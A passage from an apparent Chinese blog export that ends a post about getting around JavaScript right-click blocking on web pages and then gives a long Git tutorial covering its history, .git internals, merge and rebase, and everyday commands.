style="color:#303030;text-decoration:none;"&gt;萌面人CC网&lt;/a&gt;&amp;nbsp; &lt;a href="http://mengmianren.pro/" style="color:#303030;text-decoration:none;"&gt;萌面人PRO网&lt;/a&gt; &lt;/span&gt;&lt;/div&gt; &lt;/footer&gt; &lt;/div&gt; &lt;/div&gt; &lt;meta http-equiv="imagetoolbar" content="no"&gt; &lt;script type="text/javascript"&gt; document.oncontextmenu = function() &#123; return false; &#125;; document.onselectstart = function() &#123; if (event.srcElement.type != "text" &amp;&amp; event.srcElement.type != "textarea" &amp;&amp; event.srcElement.type != "password") &#123; return false; &#125; else &#123; return true; &#125; &#125;; if (window.sidebar) &#123; document.onmousedown = function(e) &#123; var obj = e.target; if (obj.tagName.toUpperCase() == 'SELECT' || obj.tagName.toUpperCase() == "INPUT" || obj.tagName.toUpperCase() == "TEXTAREA" || obj.tagName.toUpperCase() == "PASSWORD") &#123; return true; &#125; else &#123; return false; &#125; &#125;; &#125; document.ondragstart = function() &#123; return false; &#125;; &lt;/script&gt; &lt;script type='text/javascript'&gt; var pvcArgsFrontend = &#123; "mode": "ajax", "requestURL": "http:\/\/www.gebidemengmianren.com\/wp-content\/plugins\/post-views-counter\/includes\/ajax.php", "postID": "198", "nonce": "8b28046242" &#125;; &lt;/script&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/plugins/post-views-counter/js/frontend.js?ver=1.3.1'&gt;&lt;/script&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/plugins/bj-lazy-load/js/bj-lazy-load.min.js?ver=2'&gt;&lt;/script&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/wp-embed.min.js?ver=6f0a90e1258fc95d5c87f731d5ec4784'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 破解方法 查看源码的一个简单方法： 在浏览器的地址栏输入以下东西，即可查看源码 1view-source:url 假如是通过js禁用的话，可以在控制台下输入 1234document.body.oncontextmenu="return true";//右键菜单document.body.onselectstart="return true";//文本选择]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git]]></title>
    <url>%2F2019%2F09%2F23%2Fgit%2F</url>
    <content type="text"><![CDATA[Git 引用： Git详细使用教程 Git教程 Git本地服务器搭建及使用方法 Git原理入门解析 使用原理视角看Git Git 的诞生： 很多人都知道，Linus 在 1991 年创建了开源的 Linux，从此，Linux 系统不断发展，已经成为最大的服务器系统软件了。 Linus 虽然创建了 Linux，但 Linux 的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为 Linux 编写代码，那 Linux 的代码是如何管理的呢？ 事实是，在 2002 年以前，世界各地的志愿者把源代码文件通过 diff 的方式发给 Linus，然后由 Linus 本人通过手工方式合并代码！ 你也许会想，为什么 Linus 不把 Linux 代码放到版本控制系统里呢？不是有 CVS、SVN 这些免费的版本控制系统吗？因为 Linus 坚定地反对 CVS 和 SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比 CVS、SVN 好用，但那是付费的，和 Linux 的开源精神不符。 不过，到了 2002 年，Linux 系统已经发展了十年了，代码库之大让 Linus 很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是 Linus 选择了一个商业的版本控制系统 BitKeeper，BitKeeper 的东家 BitMover 公司出于人道主义精神，授权 Linux 社区免费使用这个版本控制系统。 安定团结的大好局面在 2005 年就被打破了，原因是 Linux 社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发 Samba 的 Andrew 试图破解 BitKeeper 的协议（这么干的其实也不只他一个），被 BitMover 公司发现了（监控工作做得不错！），于是 BitMover 公司怒了，要收回 Linux 社区的免费使用权。 Linus 可以向 BitMover 公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是：Linus 花了两周时间自己用 C 写了一个分布式版本控制系统，这就是 Git！一个月之内，Linux 系统的源码已经由 Git 管理了！牛是怎么定义的呢？大家可以体会一下。 Git 迅速成为最流行的分布式版本控制系统，尤其是 2008 年，GitHub 网站上线了，它为开源项目免费提供 Git 存储，无数开源项目开始迁移至 GitHub，包括 jQuery，PHP，Ruby 等等。 历史就是这么偶然，如果不是当年 BitMover 公司威胁 Linux 社区，可能现在我们就没有免费而超级好用的 Git 了。 Git是什么Git是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。Git是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。Git与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。 先说集中式版本控制系统，版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，再把自己的活推送给中央服务器。中央服务器就好比是一个图书馆，你要改一本书，必须先从图书馆借出来，然后回到家自己改，改完了，再放回图书馆。 那分布式版本控制系统与集中式版本控制系统有何不同呢？首先，分布式版本控制系统根本没有 “中央服务器”，每个人的电脑上都是一个完整的版本库，这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件 A，你的同事也在他的电脑上改了文件 A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。集中式版本控制系统最大的毛病就是必须联网才能工作。 Git与SVN的区别GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。Git 与 SVN 区别点： GIT是分布式的，SVN不是：这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。 2.GIT把内容按元数据方式存储，而SVN是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。 GIT分支和SVN的分支不同：分支在SVN中一点不特别，就是版本库中的另外的一个目录。 GIT没有一个全局的版本号，而SVN有：目前为止这是跟SVN相比GIT缺少的最大的一个特征。 GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。 Git原理详细图文解释可参考此篇文章使用原理视角看Git，里面详细用图文解释了git的版本控制原理 git的工作流程大概如下： 克隆 Git 资源作为工作目录。 在克隆的资源上添加或修改文件。 如果其他人修改了，你可以更新资源。 在提交前查看修改。 提交修改。 在修改完成后，如果发现错误，可以撤回提交并再次修改并提交。 基本概念我们先来理解下Git 工作区、暂存区和版本库概念 工作区：就是你项目的目录（可见目录）。 缓存区：英文叫stage, 或index。一般存放在”git目录”下的index文件（.git/index）中，所以我们把暂存区有时也叫作索引（index）。 版本库：工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库。 下面这个图展示了工作区、版本库中的暂存区和版本库之间的关系： 如果我们要对项目进行管理，就切换到该项目目录底下，使用git init命令，进行初始化 1$git init git init 命令只会做一件事，就是在项目的根目录下创建一个 .git 的子目录，用来保存当前项目的一些版本信息，我们可以继续使用 tree -a 命令查看该目录的完整结构，如下： 1234567891011121314151617181920212223242526272829$tree -a.└── .git ├── HEAD ├── branches ├── config ├── description ├── hooks │ ├── applypatch-msg.sample │ ├── commit-msg.sample │ ├── fsmonitor-watchman.sample │ ├── post-update.sample │ ├── pre-applypatch.sample │ ├── pre-commit.sample │ ├── pre-push.sample │ ├── pre-rebase.sample │ ├── pre-receive.sample │ ├── prepare-commit-msg.sample │ └── update.sample ├── index ├── info │ └── exclude ├── objects │ ├── .DS_Store │ ├── info │ └── pack └── refs ├── heads └── tags Git目录解析config 目录config 是仓库的配置文件，一个典型的配置文件如下，我们创建的远端，分支都在等信息都在配置文件里有表现；fetch 操作的行为也是在这里配置的： 12345678910111213141516[core] repositoryformatversion = 0 filemode = false bare = false logallrefupdates = true symlinks = false ignorecase = true[remote &quot;origin&quot;] url = git@github.com:yanhaijing/zepto.fullpage.git fetch = +refs/heads/*:refs/remotes/origin/*[branch &quot;master&quot;] remote = origin merge = refs/heads/master[branch &quot;dev&quot;] remote = origin merge = refs/heads/dev objects 目录Git 可以通过一种算法可以得到任意文件的 “指纹”（40 位 16 进制数字），然后通过文件指纹存取数据，存取的数据都位于 objects 目录。 例如我们可以手动创建一个测试文本文件并使用 git add . 命令来观察 .git 文件夹出现的变化： 12$ touch test.txt$ git add . git add . 命令就是用于把当前新增的变化添加进 Git 本地仓库的，在我们使用后，我们惊奇的发现 .git 目录下的 objects/ 目录下多了一个目录： 12345678910111213141516171819202122$ tree -a.├── .git│ ├── HEAD│ ├── branches│ ├── config│ ├── description│ ├── hooks│ │ ├── 节省篇幅..省略..│ ├── index│ ├── info│ │ └── exclude│ ├── objects│ │ ├── .DS_Store│ │ ├── e6│ │ │ └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391│ │ ├── info│ │ └── pack│ └── refs│ ├── heads│ └── tags└── test.txt 我们可以使用 git hash-object test.txt 命令来看看刚才我们创建的 test.txt 的 “文件指纹”： 12$ git hash-object test.txte69de29bb2d1d6434b8b29ae775ad8c2e48c5391 这时候我们可以发现，新创建的目录 e6 其实是该文件哈希值的前两位，这其实是 Git 做的一层类似于索引一样的东西，并且默认采用 16 进制的两位数来当索引，是非常合适的。 这边其实引入了Sha-1算法 SHA-1将文件中的内容通过通过计算生成一个 40 位长度的hash值。 Sha-1的非常有特点： 由文件内容计算出的hash值 hash值相同，文件内容相同 对于添加的内容，无论我们执行多少次，都会得到相同的结果。因此，文件的sha-1值是可以作为文件的唯一 id 。同时，它还有一个额外的功能，校验文件完整性。 objects 目录下有 3 种类型的数据： Blob； Tree; Commit； 文件都被存储为 blob 类型的文件，文件夹被存储为 tree 类型的文件，创建的提交节点被存储为 Commit 类型的数据； 一般我们系统中的目录(tree)，在 Git 会像下面这样存储： 而 Commit 类型的数据则整合了 tree 和 blob 类型，保存了当前的所有变化，例如我们可以再在刚才的目录下新建一个目录，并添加一些文件试试： 1234567891011121314151617181920212223242526$ mkdir test$ touch test/test.file$ tree -a.├── .git│ ├── HEAD│ ├── branches│ ├── config│ ├── description│ ├── hooks│ │ ├── 节省篇幅..省略..│ ├── index│ ├── info│ │ └── exclude│ ├── objects│ │ ├── .DS_Store│ │ ├── e6│ │ │ └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391│ │ ├── info│ │ └── pack│ └── refs│ ├── heads│ └── tags├── test│ └── test.file└── test.txt 提交完Commit在观察变化 123456789101112131415161718192021222324252627282930313233343536373839$ git commit -a -m "test: 新增测试文件夹和测试文件观察.git文件的变化"[master (root-commit) 30d51b1] test: 新增测试文件夹和测试文件观察.git文件的变化 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 test.txt$ tree -a.├── .git│ ├── COMMIT_EDITMSG│ ├── HEAD│ ├── branches│ ├── config│ ├── description│ ├── hooks│ │ ├── ...省略...│ ├── index│ ├── info│ │ └── exclude│ ├── logs│ │ ├── HEAD│ │ └── refs│ │ └── heads│ │ └── master│ ├── objects│ │ ├── .DS_Store│ │ ├── 30│ │ │ └── d51b1edd2efd551dd6bd52d4520487b5708c0e│ │ ├── 5e│ │ │ └── fb9bc29c482e023e40e0a2b3b7e49cec842034│ │ ├── e6│ │ │ └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391│ │ ├── info│ │ └── pack│ └── refs│ ├── heads│ │ └── master│ └── tags├── test│ └── test.file└── test.txt 首先我们可以观察到我们提交了一个 Commit 的时候在第一句话里面返回了一个短的像是哈希值一样的东西： [master (root-commit) 30d51b1] 中 的 30d51b1，对应的我们也可以在 objects 找到刚才 commit 的对象，我们可以使用 git cat-file -p 命令输出一下当前文件的内容： 123456$ git cat-file -p 30d5tree 5efb9bc29c482e023e40e0a2b3b7e49cec842034author 我没有三颗心脏 1565742122 +0800committer 我没有三颗心脏 1565742122 +0800test: 新增测试文件夹和测试文件观察.git文件的变化 我们发现这里面有提交的内容信息、作者信息、提交者信息以及 commit message，当然我们可以进一步看到提交的内容具体有哪些： 12$ git cat-file -p 5efb100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 test.txt 我们再试着提交一个 commit 来观察变化: 12345678910111213$ touch test/test2.file$ git commit -a -m "test: 新增加一个 commit 以观察变化."[master 9dfabac] test: 新增加一个 commit 以观察变化. 2 files changed, 0 insertions(+), 0 deletions(-) create mode 100644 test/test.file create mode 100644 test/test2.file$ git cat-file -p 9dfabactree c562bfb9441352f4c218b0028148289f1ea7d7cdparent 30d51b1edd2efd551dd6bd52d4520487b5708c0eauthor 龙滔 1565878699 +0800committer 龙滔 1565878699 +0800test: 新增加一个 commit 以观察变化. 可以观察到这一次的 commit 多了一个 parent 的行，其中的 “指纹” 和上一次的 commit 一模一样，当我们提交两个 commit 之后我们的 Git 仓库可以简化为下图： 说明：其中因为我们 test 文件夹新增了文件，也就是出现了变化，所以就被标识成了新的 tree 类型的对象； refs 目录refs 目录存储都是引用文件，如本地分支，远端分支，标签等 refs/heads/xxx 本地分支 refs/remotes/origin/xxx 远端分支 refs/tags/xxx 本地tag 引用文件的内容都是 40 位长度的 commit 12$ cat .git/refs/heads/master9dfabac68470a588a4b4a78742249df46438874a 这就像是一个指针一样，它指向了你的最后一次提交（例如这里就指向了第二次提交的 commit），我们补充上分支信息，现在的 Git 仓库就会像下图所示： HEAD 目录HEAD 目录下存储的是当前所在的位置，其内容是分支的名称： 12$ cat HEADref: refs/heads/master 我们再补充上 HEAD 的信息，现在的 Git 仓库如下图所示： git的冲突处理以下主要参考以下两篇文章 git冲突处理图解 使用原理视角看 Git 讲完git的目录结构，我们可知道分支在git中仅是一个指针，但是在分布式工作中，无可避免的会遇见冲突（分支的合并） 图上的情况，并不是移动分支指针就能够解决问题的，它需要一种合并策略。首先我们需要明确的是谁与谁的合并，是 2，3 与 4， 5， 6 两条线的合并吗？其实并不是的，真实合并的其实只有 3 和 6，因为每一次的提交都包含了项目完整的快照，即合并只是 tree 与 tree 的合并。 这可能说起来有点绕，我们可以先来想一个简单的算法，用来比较 3 和 6 的不同。如果我们只是单纯的比较 3 和 6 的信息，其实并没有意义，因为它们之间并不能确切的表达出当前的冲突状态。因此我们需要选取它们两个分支的分歧点（merge base）作为参考点，进行比较。 首先我们把 1 作为基础，然后把 1、3、6 中所有的文件做一个列表，然后依次遍历这个列表中的文件。我们现在拿列表中的一个文件进行举例，把在提交在 1、3、6 中的该文件分别称为版本1、版本3、版本6，可能出现如下几种情况： 1. 版本 1、版本 3、版本 6 的 “指纹” 值都相同：这种情况则说明没有冲突；2. 版本 3 or 版本 6 至少有一个与版本 1 状态相同（指的是指纹值相同或都不存在）：这种情况可以自动合并，比如版本 1 中存在一个文件，在版本 3 中没有对该文件进行修改，而版本 6 中删除了这个文件，则以版本 6 为准就可以了；3. 版本 3 or 版本 6 都与版本 1 的状态不同：这种情况复杂一些，自动合并策略很难生效了，所以需要手动解决； merge 操作在解决完冲突后，我们可以将修改的内容提交为一个新的提交，这就是 merge。 可以看到 merge 是一种不修改分支历史提交记录的方式，这也是我们常用的方式。但是这种方式在某些情况下使用起来不太方便，比如我们创建了一些提交发送给管理者，管理者在合并操作中产生了冲突，还需要去解决冲突，这无疑增加了他人的负担。 而我们使用 rebase 可以解决这种问题。 rebase 操作假设我们的分支结构如下： rebase 会把从 Merge Base 以来的所有提交，以补丁的形式一个一个重新打到目标分支上。这使得目标分支合并该分支的时候会直接 Fast Forward（可以简单理解为直接后移指针），即不会产生任何冲突。提交历史是一条线，这对强迫症患者可谓是一大福音。 其实 rebase 主要是在 .git/rebase-merge 下生成了两个文件，分别为 git-rebase-todo 和 done 文件，这两个文件的作用光看名字就大概能够看得出来。git-rebase-todo 中存放了 rebase 将要操作的 commit，而 done 存放正操作或已操作完毕的 commit，比如我们这里，git-rebase-todo 存放了 4、5、6 三个提交。 首先 Git 会把 4 这个 commit 放入 done，表示正在操作 4，然后将 4 以补丁的方式打到 3 上，形成了新的 4`，这一步是可能产生冲突的，如果有冲突，需要解决冲突之后才能继续操作。 接着按同样的方式把 5、6 都放入 done，最后把指针移动到最新的提交 6 上，就完成了 rebase 的操作。 从刚才的图中，我们就可以看到 rebase 的一个缺点，那就是修改了分支的历史提交。如果已经将分支推送到了远程仓库，会导致无法将修改后的分支推送上去，必须使用 -f 参数（force）强行推送。 所以使用 rebase 最好不要在公共分支上进行操作。 Squash and Merge 操作简单说就是压缩提交，把多次的提交融合到一个 commit 中，这样的好处不言而喻，我们着重来讨论一下实现的技术细节，还是以我们上面最开始的分支情况为例，首先，Git 会创建一个临时分支，指向当前 feature 的最新 commit。 然后按照上面 rebase 的方式，变基到 master 的最新 commit 处。 接着用 rebase 来 squash 之，压缩这些提交为一个提交。 最后以 fast forward 的方式合并到 master 中。 可见此时 master 分支多且只多了一个描述了这次改动的提交，这对于大型工程，保持主分支的简洁易懂有很大的帮助。 git基本操作git配置Git 提供了一个叫做 git config 的工具，专门用来配置或读取相应的工作环境变量。这些环境变量，决定了 Git 在各个环节的具体工作方式和行为。这些变量可以存放在以下三个不同的地方： /etc/gitconfig 文件：系统中对所有用户都普遍适用的配置。若使用 git config 时用 –system 选项，读写的就是这个文件。~/.gitconfig 文件：用户目录下的配置文件只适用于该用户。若使用 git config 时用 –global 选项，读写的就是这个文件。当前项目的 Git 目录中的配置文件（也就是工作目录中的 .git/config 文件）：这里的配置仅仅针对当前项目有效。每一个级别的配置都会覆盖上层的相同配置，所以 .git/config 里的配置会覆盖 /etc/gitconfig 中的同名变量。 在 Windows 系统上，Git 会找寻用户主目录下的 .gitconfig 文件。主目录即 $HOME 变量指定的目录，一般都是 C:\Documents and Settings\$USER。 此外，Git 还会尝试找寻 /etc/gitconfig 文件，只不过看当初 Git 装在什么目录，就以此作为根目录来定位。 1.用户信息 git config user在使用git提交前，一定要配置提交者个人的用户名称和电子邮件 12$ git config --global user.name "wyndam"$ git config --global user.email "only.night@qq.com" 如果用了--global选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。如果要在某个特定的项目中使用其他名字或者电邮，只要去掉–global选项重新配置即可，新的设定保存在当前项目的 .git/config 文件里。 2.文本编辑器设置Git默认使用的文本编辑器, 一般可能会是 Vi 或者 Vim。如果你有其他偏好，比如 Emacs 的话，可以重新设置： 1$ git config --global core.editor emacs 3.差异分析工具还有一个比较常用的是，在解决合并冲突时使用哪种差异分析工具。比如要改用 vimdiff 的话： 1$ git config --global merge.tool vimdiff Git 可以理解 kdiff3，tkdiff，meld，xxdiff，emerge，vimdiff，gvimdiff，ecmerge，和 opendiff 等合并工具的输出信息。当然，你也可以指定使用自己开发的工具。 4.查看配置信息 git config --list要检查已有的配置信息，可以使用 git config –list 命令： 12345678910111213141516171819$ git config --listcore.symlinks=falsecore.autocrlf=truecolor.diff=autocolor.status=autocolor.branch=autocolor.interactive=truepack.packsizelimit=2ghelp.format=htmlhttp.sslcainfo=E:/Platform/Git/mingw32/ssl/certs/ca-bundle.crtdiff.astextplain.textconv=astextplainrebase.autosquash=truefilter.lfs.clean=git-lfs clean %ffilter.lfs.smudge=git-lfs smudge %ffilter.lfs.required=trueuser.name=Wyndamuser.email=only.night@qq.comcore.editor=subl 有时候会看到重复的变量名，那就说明它们来自不同的配置文件（比如 /etc/gitconfig 和 ~/.gitconfig），不过最终 Git 实际采用的是最后一个。这些配置我们也可以在 ~/.gitconfig 或 /etc/gitconfig 看到，如下所示： 123456789[filter &quot;lfs&quot;] clean = git-lfs clean %f smudge = git-lfs smudge %f required = true[user] name = Wyndam email = only.night@qq.com[core] editor = subl 也可以直接查阅某个环境变量的设定，只要把特定的名字跟在后面即可，像这样： 123$ git config user.emailmagic@outlook.com 新建git本地仓库Git 使用 git init 命令来初始化一个 Git 仓库，Git 的很多命令都需要在 Git 的仓库中运行，所以 git init 是使用 Git 的第一个命令。在执行完成 git init 命令后，Git 仓库会生成一个 .git 目录，该目录包含了资源的所有元数据，其他的项目目录保持不变（不像 SVN 会在每个子目录生成 .svn 目录，Git 只在仓库的根目录生成 .git 目录）。 在工作目录下使用命令git init 1$git init (path) 若没有指定path，则默认当前目录下建立git仓库。 初始化后，会在工作目录下会出现一个名为 .git 的目录，所有 Git 需要的数据和资源都存放在这个目录中。如果当前目录下有几个文件想要纳入版本控制，需要先用 git add 命令告诉 Git 开始对这些文件进行跟踪，然后提交： 12$ git add . (path|file)$ git commit -m "inital commit" 以上命令就是把文件/文件夹提交至仓库中，若是远程仓库，还需要命令git push 复制远程仓库 git clone我们使用 git clone 从现有 Git 仓库中拷贝项目（类似 svn checkout）。克隆仓库的命令格式为: 1$ git clone &lt;repo|url&gt; (&lt;directory&gt;) 参数说明： \&lt;repo|url&gt;：为Git仓库的地址url \：为将git储存至目标目录，若为空，则默认本地目录 Git支持ssh，git，http和https协议（此外，可以使用ftp和ftps进行获取，但这效率低下且不建议使用；请勿使用它）。 ssh://[user@]host.xz[:port]/path/to/repo.git/ git://host.xz[:port]/path/to/repo.git/ http[s]://host.xz[:port]/path/to/repo.git/ ftp[s]://host.xz[:port]/path/to/repo.git/ 也可以用类似scp的语法进行clone（实际上是ssh协议） [user@]host.xz:path/to/repo.git/ 查看状态git statusgit status 以查看在你上次提交之后是否有修改。我演示该命令的时候加了 -s 参数，以获得简短的结果输出。如果没加该参数会详细输出内容： 123456789$ git statusOn branch masterInitial commitChanges to be committed: (use "git rm --cached &lt;file&gt;..." to unstage) new file: README.md 从缓存中移除文件 git reset HEADgit reset HEAD 命令用于取消已缓存的内容。我们先改动文件 README 文件，内容如下： 123#README.md##This is readme markdown file HelloWorld.java 文件修改为： 12345public class HelloWorld &#123; public static void main(String[] args) &#123; System.out.println("Hello World!"); &#125;&#125; 现在两个文件修改后，都提交到了缓存区，我们现在要取消其中一个的缓存，操作如下： 12345678910111213$ git status -s M HelloWorld.java M README.md$ git add .$ git status -sM HelloWorld.javaM README.md$ git reset HEAD -- HelloWorld.javaUnstaged changes after reset:M HelloWorld.java$ git status -s M HelloWorld.javaM README.md 现在执行 git commit，只会将 README.md 文件的改动提交，而 HelloWorld.java 是没有的。 12345$ git commit -m "change"[master ad5f6fe] change 1 file changed, 1 insertion(+), 1 deletion(-)$ git status -s M HelloWorld.java 可以看到 HelloWorld.java 文件的修改并为提交。这时我们可以使用以下命令将 HelloWorld.java 的修改提交： 123456$ git commit -am "修改 HelloWorld.java 文件"[master a055c08] 修改 HelloWorld.java 文件 1 file changed, 1 insertion(+), 1 deletion(-)$ git statusOn branch masternothing to commit, working directory clean 简而言之，执行 git reset HEAD 以取消之前 git add 添加，但不希望包含在下一提交快照中的缓存。 从缓存以及工作目录删除文件 git rmgit rm 会将条目从缓存区中移除。这与 git reset HEAD 将条目取消缓存是有区别的。 “取消缓存”的意思就是将缓存区恢复为我们做出修改之前的样子。默认情况下，git rm file 会将文件从缓存区和你的硬盘中（工作目录）删除。如果你要在工作目录中留着该文件，可以使用 git rm –cached：如我们删除 hello.java文件：(包括在本地目录下的文件，可能需要选项-f) 1234$ git rm HelloWorld.javarm 'HelloWorld.java'$ lsREADME.md 不从工作区中删除文件： 1234$ git rm README.md --cachedrm 'README.md'$ lsREADME.md 修改缓存中文件名 git mvgit mv 命令做得所有事情就是 git rm –cached 命令的操作， 重命名磁盘上的文件，然后再执行 git add 把新文件添加到缓存区。我们先把刚移除的 README 添加回来： 1234$ git add README.md$ git mv README.md README$ lsREADME Git分支管理几乎每一种版本控制系统都以某种形式支持分支。使用分支意味着你可以从开发主线上分离开来，然后在不影响主线的同时继续工作。有人把 Git 的分支模型称为”必杀技特性”，而正是因为它，将 Git 从版本控制系统家族里区分出来。创建分支命令： 1234567891011#创建分支$ git branch [branch name]#切换分支$ git checkout [branch name]#创建并切换分支$ git checkout -b [branch name]#合并分支$ git merge#删除分支$ git branch -d [branch name] Git分支管理12345678910111213141516171819202122#列出问题$ git branch#无参数时，该命令会列出本地分支$ git branch* master#创建分支$ git branch testbranch$ git branch* branch testbranch$ git branch testing$ git branch -D testingDeleted branch testing (was 84b13b9).#合并分支,将分支[branch name] 合并到当前分支$ git merge [branch name]$ git merge testUpdating b04e1bb..d3c2604Fast-forward testB | 0 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 testB Git 查看提交历史 git log123456789101112131415161718192021222324252627282930313233343536373839404142434445464748$ git logcommit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/test, test)Author: Magic &lt;xxx@qq.com&gt;Date: Sat Sep 28 23:41:42 2019 +0800 ffcommit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master)Author: Magic &lt;xxx@qq.com&gt;Date: Sat Sep 28 23:40:34 2019 +0800 fuck#可以用 --oneline 选项来查看历史记录的简洁的版本$ git log --onelined3c2604 (HEAD -&gt; master, origin/test, test) ffb04e1bb (origin/master) fuck#可以用 --graph 选项，查看历史中什么时候出现了分支、合并。以下为相同的命令，开启了拓扑图选项：$ git log --graph* commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/test, test)| Author: Magic-King &lt;xxx@qq.com&gt;| Date: Sat Sep 28 23:41:42 2019 +0800|| ff|* commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master) Author: Magic-King &lt;xxx@qq.com&gt; Date: Sat Sep 28 23:40:34 2019 +0800 fuck #可以用 ‘--reverse’参数来逆向显示所有日志$ git log --reversecommit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master)Author: Magic-King &lt;xxx@qq.com&gt;Date: Sat Sep 28 23:40:34 2019 +0800 fuckcommit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/test, test)Author: Magic-King &lt;xxx@qq.com&gt;Date: Sat Sep 28 23:41:42 2019 +0800 ff Git 标签 git tag如果达到一个重要的阶段，并希望永远记住那个特别的提交快照，可以使用 git tag 给它打上标签。比如说，我们想为我们的项目发布一个”1.0”版本。 可以用 git tag -a v1.0 命令给最新一次提交打上（HEAD）”v1.0”的标签。-a 选项意为”创建一个带注解的标签”。 不用 -a 选项也可以执行的，但它不会记录这标签是啥时候打的，谁打的，也不会让你添加个标签的注解。 我推荐一直创建带注解的标签。 12345678910111213$ git log --oneline --graph --decorate* 2b5970d (HEAD -&gt; master, tag: v1.0) Merge branch 'change_site'|\| * d17a0a0 (change_site) change the site* | e2714c9 新增加一行|/* 202199d (newtest) add test.txt file* a055c08 修改 HelloWorld.java 文件* ad5f6fe 修改* c2c167c 修改HelloWorld.java文件* f9393bf third commit ``* 316fafc second commit* fdd5c53 inital commit 如果我们忘了给某个提交打标签，又将它发布了，我们可以给它追加标签。例如，假设我们发布了提交 85fc7e7(上面实例最后一行)，但是那时候忘了给它打标签。 我们现在也可以： 1234567891011121314$ git tag -a v0.9 a055c08$ git log --oneline --graph --decorate* 2b5970d (HEAD -&gt; master, tag: v1.0) Merge branch 'change_site'|\| * d17a0a0 (change_site) change the site* | e2714c9 新增加一行|/* 202199d (newtest) add test.txt file* a055c08 (tag: v0.9) 修改 HelloWorld.java 文件* ad5f6fe 修改* c2c167c 修改HelloWorld.java文件* f9393bf third commit ``* 316fafc second commit* fdd5c53 inital commit 如果要查看所有标签可以使用以下命令： 1$ git tag 指定标签信息命令： 1git tag -a &lt;tagname&gt; -m "标签" PGP签名标签命令： 1git tag -s &lt;tagname&gt; -m "标签" Git 远程仓库的操作查看当前远程库12345$ git remoteorigin$ git remote -vorigin git@xx.xx.xxx.xxx:/test.git (fetch)origin git@xx.xx.xxx.xxx:/test.git (push) 提取远程库1$ git pull 该命令就是在执行 git fetch 之后紧接着执行 git merge 远程分支到你所在的任意分支。假设你配置好了一个远程仓库，并且你想要提取更新的数据，你可以首先执行 git fetch [alias] 告诉 Git 去获取它有你没有的数据，然后你可以执行 git merge [alias]/[branch] 以将服务器上的任何更新（假设有人这时候推送到服务器了）合并到你的当前分支。 接下来我们在 Github 上点击”test.txt” 并在线修改它。之后我们在本地更新修改。 123456789101112$ git fetch originremote: Counting objects: 3, done.remote: Compressing objects: 100% (3/3), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.From github.com:onlynight/GitAdd 774112b..37be49b master -&gt; origin/master$ git merge origin/masterUpdating 774112b..37be49bFast-forward test.txt | 1 + 1 file changed, 1 insertion(+) 推送远程库推送你的新分支与数据到某个远端仓库命令 12345#该命令将你的 [branch] 分支推送成为 [alias] 远程仓库上的 [branch] 分支$ git push [alias] [branch]$ git push origin masterEverything up-to-date 删除远程分支注意：如果要删除远程分支同样也是使用push命令，在分支前加上”:”表示删除远程分支，代码如下 1$ git push origin :&lt;branch name&gt; 删除本地仓库的远程仓库链接删除远程仓库你可以使用命令 1234567891011121314git remote rm [alias]$ git remote -vorigin git@github.com:onlynight/GitAdd.git (fetch)origin git@github.com:onlynight/GitAdd.git (push)$ git remote -vorigin git@github.com:onlynight/GitAdd.git (fetch)origin git@github.com:onlynight/GitAdd.git (push)origin2 git@github.com:onlnynight/GitAdd.git (fetch)origin2 git@github.com:onlnynight/GitAdd.git (push)$ git remote rm origin2$ git remote -vorigin git@github.com:onlynight/GitAdd.git (fetch)origin git@github.com:onlynight/GitAdd.git (push) 忽略特殊文件有些时候，你必须把某些文件放到Git工作目录中，但又不能提交它们，比如保存了数据库密码的配置文件啦，等等，每次git status都会显示Untracked files ...，有强迫症的童鞋心里肯定不爽。 好在Git考虑到了大家的感受，这个问题解决起来也很简单，在Git工作区的根目录下创建一个特殊的.gitignore文件，然后把要忽略的文件名填进去，Git就会自动忽略这些文件。 不需要从头写.gitignore文件，GitHub已经为我们准备了各种配置文件，只需要组合一下就可以使用了。所有配置文件可以直接在线浏览：https://github.com/github/gitignore 忽略文件的原则是： 